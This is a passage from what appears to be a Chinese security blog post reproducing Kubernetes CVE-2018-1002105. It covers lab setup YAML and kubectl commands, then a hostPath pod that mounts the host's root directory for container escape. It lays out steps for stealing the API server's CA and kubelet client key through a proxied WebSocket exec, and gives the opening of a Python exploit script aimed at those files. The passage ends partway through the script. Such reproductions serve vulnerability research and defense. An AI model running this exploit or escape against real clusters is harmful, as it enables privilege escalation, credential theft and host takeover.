</span><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">test</span><span class="w">
</span><span class="w">  </span><span class="nt">namespace</span><span class="p">:</span><span class="w"> </span><span class="l">vul</span><span class="w">
</span><span class="w"></span><span class="nt">rules</span><span class="p">:</span><span class="w">
</span><span class="w"></span>- <span class="nt">apiGroups</span><span class="p">:</span><span class="w">
</span><span class="w">  </span>- <span class="s2">&#34;&#34;</span><span class="w">
</span><span class="w">  </span><span class="nt">resources</span><span class="p">:</span><span class="w">
</span><span class="w">  </span>- <span class="l">pods</span><span class="w">
</span><span class="w">  </span><span class="nt">verbs</span><span class="p">:</span><span class="w">
</span><span class="w">  </span>- <span class="l">get</span><span class="w">
</span><span class="w">  </span>- <span class="l">list</span><span class="w">
</span><span class="w">  </span>- <span class="l">delete</span><span class="w">
</span><span class="w">  </span>- <span class="l">watch</span><span class="w">
</span><span class="w"></span>- <span class="nt">apiGroups</span><span class="p">:</span><span class="w">
</span><span class="w">  </span>- <span class="s2">&#34;&#34;</span><span class="w">
</span><span class="w">  </span><span class="nt">resources</span><span class="p">:</span><span class="w">
</span><span class="w">  </span>- <span class="l">pods/exec</span><span class="w">
</span><span class="w">  </span><span class="nt">verbs</span><span class="p">:</span><span class="w">
</span><span class="w">  </span>- <span class="l">create</span><span class="w">
</span><span class="w">  </span>- <span class="l">get</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><ul>
<li>创建用户 test，并与角色 test 绑定</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="c"># cve_2018_1002105_role_binding.yaml</span><span class="w">
</span><span class="w"></span><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">rbac.authorization.k8s.io/v1</span><span class="w">
</span><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">RoleBinding</span><span class="w">
</span><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">test</span><span class="w">
</span><span class="w">  </span><span class="nt">namespace</span><span class="p">:</span><span class="w"> </span><span class="l">vul</span><span class="w">
</span><span class="w"></span><span class="nt">roleRef</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="nt">apiGroup</span><span class="p">:</span><span class="w"> </span><span class="l">rbac.authorization.k8s.io</span><span class="w">
</span><span class="w">  </span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Role</span><span class="w">
</span><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">test</span><span class="w">
</span><span class="w"></span><span class="nt">subjects</span><span class="p">:</span><span class="w">
</span><span class="w"></span>- <span class="nt">apiGroup</span><span class="p">:</span><span class="w"> </span><span class="l">rbac.authorization.k8s.io</span><span class="w">
</span><span class="w">  </span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Group</span><span class="w">
</span><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">test</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><ul>
<li>在命名空间 vul 内创建测试业务 Pod：</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="c"># cve_2018_1002105_pod.yaml</span><span class="w">
</span><span class="w"></span><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">v1</span><span class="w">
</span><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Pod</span><span class="w">
</span><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">test</span><span class="w">
</span><span class="w">  </span><span class="nt">namespace</span><span class="p">:</span><span class="w"> </span><span class="l">vul</span><span class="w">
</span><span class="w"></span><span class="nt">spec</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="nt">containers</span><span class="p">:</span><span class="w">
</span><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">ubuntu</span><span class="w">
</span><span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l">ubuntu:latest</span><span class="w">
</span><span class="w">    </span><span class="nt">imagePullPolicy</span><span class="p">:</span><span class="w"> </span><span class="l">IfNotPresent</span><span class="w">
</span><span class="w">    </span><span class="c"># Just spin &amp; wait forever</span><span class="w">
</span><span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;/bin/bash&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;-c&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;--&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
</span><span class="w">    </span><span class="nt">args</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;while true; do sleep 30; done;&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
</span><span class="w">  </span><span class="nt">serviceAccount</span><span class="p">:</span><span class="w"> </span><span class="l">default</span><span class="w">
</span><span class="w">  </span><span class="nt">serviceAccountName</span><span class="p">:</span><span class="w"> </span><span class="l">default</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><ul>
<li>test-csv，用户 test 的认证凭证。<code>Token, 用户名, UID, 用户组</code></li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">password,test,test,test
</code></pre></td></tr></table>
</div>
</div><p>分别应用上述 yaml：<code>kubectl apply -f xxx</code></p>
<p>配置用户认证：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">cp test-csv.csv /etc/kubernetes/pki/test-role-token.csv
</code></pre></td></tr></table>
</div>
</div><p>修改 API Server 配置文件 <code>/etc/kubernetes/manifests/kube-apiserver.yaml</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112061540290.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112061540290.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112061540290.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112061540290.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112061540290.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112061540290.png-water_print" /></p>
<p>最后的结果：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112061538436.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112061538436.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112061538436.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112061538436.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112061538436.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112061538436.png-water_print" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112061538413.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112061538413.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112061538413.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112061538413.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112061538413.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112061538413.png-water_print" /></p>
<p>检测是否部署成功：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kubectl --token<span class="o">=</span>password --server<span class="o">=</span>https://129.226.12.58:6443 --insecure-skip-tls-verify <span class="nb">exec</span> -it <span class="nb">test</span> -n vul /bin/hostname

kubectl --token<span class="o">=</span>password --server<span class="o">=</span>https://129.226.12.58:6443 --insecure-skip-tls-verify get pods -n kube-system
</code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112061556183.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112061556183.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112061556183.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112061556183.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112061556183.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202112061556183.png-water_print" /></p>
<h4 id="333-漏洞复现">3.3.3 漏洞复现</h4>
<p>目标：通过该漏洞，进行提权，创建一个挂载主机根目录的 Pod，实现容器逃逸。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="c"># attacker.yaml</span><span class="w">
</span><span class="w"></span><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">v1</span><span class="w">
</span><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Pod</span><span class="w">
</span><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">attacker</span><span class="w">
</span><span class="w"></span><span class="nt">spec</span><span class="p">:</span><span class="w">
</span><span class="w">  </span><span class="nt">containers</span><span class="p">:</span><span class="w">
</span><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">ubuntu</span><span class="w">
</span><span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l">ubuntu:latest</span><span class="w">
</span><span class="w">    </span><span class="nt">imagePullPolicy</span><span class="p">:</span><span class="w"> </span><span class="l">IfNotPresent</span><span class="w">
</span><span class="w">    </span><span class="c"># Just spin &amp; wait forever</span><span class="w">
</span><span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;/bin/bash&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;-c&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;--&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
</span><span class="w">    </span><span class="nt">args</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;while true; do sleep 30; done;&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
</span><span class="w">    </span><span class="nt">volumeMounts</span><span class="p">:</span><span class="w">
</span><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">escape-host</span><span class="w">
</span><span class="w">      </span><span class="nt">mountPath</span><span class="p">:</span><span class="w"> </span><span class="l">/host-escape-door</span><span class="w">
</span><span class="w">  </span><span class="nt">volumes</span><span class="p">:</span><span class="w">
</span><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">escape-host</span><span class="w">
</span><span class="w">      </span><span class="nt">hostPath</span><span class="p">:</span><span class="w">
</span><span class="w">        </span><span class="nt">path</span><span class="p">:</span><span class="w"> </span><span class="l">/</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><p>思路：</p>
<ol>
<li>构造错误请求，建立经 Kubernetes API Server 代理到 Kubelet 的高权限 WebSocket 连接。</li>
<li>利用高权限 Websocket 连接，向 Kubelet 发起 <code>/runningpods/</code> 请求，获得当前活动 Pod 列表。</li>
<li>从活动 Pod 列表中找到 Kuberetes API Server 的 Pod 名称。</li>
<li>利用高权限 WebSocket 连接，向 Kubelet 发起 <code>/exec</code> 请求，指定 Pod 为上一步中获得的 Pod 名称，携带“利用 cat 命令读取 ca.crt”作为参数，从返回结果中保存窃取到的文件。</li>
<li>利用高权限 WebSocket 连接，向 Kubelet 发起 <code>/exec</code> 请求，指定 Pod 为上一步中获得的 Pod 名称，携带“利用 cat 命令读取 <code>apiserver-kubelet-client.crt</code> ”作为参数，从返回结果中保存窃取到的文件。</li>
<li>利用高权限 WebSocket 连接，向 Kubelet 发起 <code>/exec</code> 请求，指定 Pod 为上一步中获得的 Pod 名称，携带“利用 cat 命令读取 apiserver-kubelet-client.key”作为参数，从返回结果中保存窃取到的文件</li>
<li>使用 kubectl 命令行工具，指定访问凭证为第 4、5、6 步中窃取到的文件，创建挂载了宿主机根目录的 Pod，实现容器逃逸。</li>
</ol>
<p>EXP 如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="s2">&#34;&#34;&#34;ExP for CVE-2018-1002105
</span><span class="s2">ONLY USED FOR SECURITY RESEARCH
</span><span class="s2">ILLEGAL USE IS **PROHIBITED**
</span><span class="s2">&#34;&#34;&#34;</span>

<span class="kn">from</span> <span class="nn">secrets</span> <span class="kn">import</span> <span class="n">base64</span><span class="p">,</span> <span class="n">token_bytes</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">ssl</span>
<span class="kn">from</span> <span class="nn">urllib</span> <span class="kn">import</span> <span class="n">parse</span>
<span class="kn">import</span> <span class="nn">json</span>

<span class="k">try</span><span class="p">:</span>
    <span class="kn">from</span> <span class="nn">http_parser.parser</span> <span class="kn">import</span> <span class="n">HttpParser</span>
<span class="k">except</span> <span class="ne">ImportError</span><span class="p">:</span>
    <span class="kn">from</span> <span class="nn">http_parser.pyparser</span> <span class="kn">import</span> <span class="n">HttpParser</span>

<span class="n">context</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">create_default_context</span><span class="p">(</span><span class="n">ssl</span><span class="o">.</span><span class="n">Purpose</span><span class="o">.</span><span class="n">CLIENT_AUTH</span><span class="p">)</span>

<span class="c1"># Args</span>
<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s1">&#39;ExP for CVE-2018-1002105.&#39;</span><span class="p">)</span>
<span class="n">required</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">add_argument_group</span><span class="p">(</span><span class="s1">&#39;required arguments&#39;</span><span class="p">)</span>
<span class="n">required</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--target&#39;</span><span class="p">,</span> <span class="s1">&#39;-t&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;host&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
                      <span class="n">help</span><span class="o">=</span><span class="s1">&#39;API Server</span><span class="se">\&#39;</span><span class="s1">s IP&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">required</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--port&#39;</span><span class="p">,</span> <span class="s1">&#39;-p&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;port&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
                      <span class="n">help</span><span class="o">=</span><span class="s1">&#39;API Server</span><span class="se">\&#39;</span><span class="s1">s port&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">required</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--bearer-token&#39;</span><span class="p">,</span> <span class="s1">&#39;-b&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;token&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
                      <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Bearer token for the low privileged user&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">required</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--namespace&#39;</span><span class="p">,</span> <span class="s1">&#39;-n&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;namespace&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
                      <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Namespace with method access&#39;</span><span class="p">,</span>
                      <span class="n">default</span><span class="o">=</span><span class="s1">&#39;default&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">required</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--pod&#39;</span><span class="p">,</span> <span class="s1">&#39;-P&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;pod&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
                      <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Pod with method access&#39;</span><span class="p">)</span>
<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>

<span class="c1"># HTTP Gadgets</span>
<span class="n">http_delimiter</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span>
<span class="n">host_header</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;Host: </span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">host</span><span class="si">}</span><span class="s1">:</span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">port</span><span class="si">}</span><span class="s1">&#39;</span>
<span class="n">auth_header</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;Authorization: Bearer </span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">token</span><span class="si">}</span><span class="s1">&#39;</span>
<span class="n">conn_header</span> <span class="o">=</span> <span class="s1">&#39;Connection: upgrade&#39;</span>
<span class="n">upgrade_header</span> <span class="o">=</span> <span class="s1">&#39;Upgrade: websocket&#39;</span>
<span class="n">agent_header</span> <span class="o">=</span> <span class="s1">&#39;User-Agent: curl/7.64.1&#39;</span>
<span class="n">accept_header</span> <span class="o">=</span> <span class="s1">&#39;Accept: */*&#39;</span>
<span class="n">origin_header</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;Origin: http://</span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">host</span><span class="si">}</span><span class="s1">:</span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">port</span><span class="si">}</span><span class="s1">&#39;</span>
<span class="n">sec_key</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">token_bytes</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
<span class="n">sec_websocket_key</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;Sec-WebSocket-Key: </span><span class="si">{</span><span class="n">sec_key</span><span class="si">}</span><span class="s1">&#39;</span>
<span class="n">sec_websocket_version</span> <span class="o">=</span> <span class="s1">&#39;Sec-WebSocket-Version: 13&#39;</span>

<span class="c1"># secret targets</span>
<span class="n">ca_crt</span> <span class="o">=</span> <span class="s1">&#39;ca.crt&#39;</span>
<span class="n">client_crt</span> <span class="o">=</span> <span class="s1">&#39;apiserver-kubelet-client.crt&#39;</span>
<span class="n">client_key</span> <span class="o">=</span> <span class="s1">&#39;apiserver-kubelet-client.key&#39;</span>


<span class="k">def</span> <span class="nf">_get_http_body</span><span class="p">(</span><span class="n">byte_http</span><span class="p">):</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">HttpParser</span><span class="p">()</span>
    <span class="n">recved</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">byte_http</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">byte_http</span><span class="p">,</span> <span class="n">recved</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recv_body</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">_recv_all_once</span><span class="p">(</span><span class="n">ssock</span><span class="p">,</span> <span class="n">length</span><span class="o">=</span><span class="mi">4096</span><span class="p">):</span>
    <span class="n">res</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
    <span class="n">incoming</span> <span class="o">=</span> <span class="kc">True</span>
    <span class="k">while</span> <span class="n">incoming</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">res</span> <span class="o">+=</span> <span class="n">ssock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">length</span><span class="p">)</span>
        <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">timeout</span><span class="p">:</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">res</span><span class="p">:</span>
                <span class="k">continue</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="k">break</span>
    <span class="k">return</span> <span class="n">res</span>


